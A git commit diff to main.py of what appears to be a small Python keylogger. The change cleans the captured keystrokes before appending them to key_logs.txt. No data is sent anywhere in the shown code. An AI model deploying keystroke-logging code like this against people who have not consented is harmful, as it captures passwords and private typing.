dcb14a56ecd0449c7f0b77d384629e2782f4d2b0
Jack Yellan <jackyellan@gmail.com>
2025-08-19 20:54:24 -0400

    push

--- main.py
+++ main.py
@@ -20,8 +20,11 @@ def on_press(key):
 def write_file(keys):
     with open("key_logs.txt", "a") as f:
         for key in keys:
-            f.write(str(key))
-    
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
 
 def on_release(key):
     if key == Key.esc:
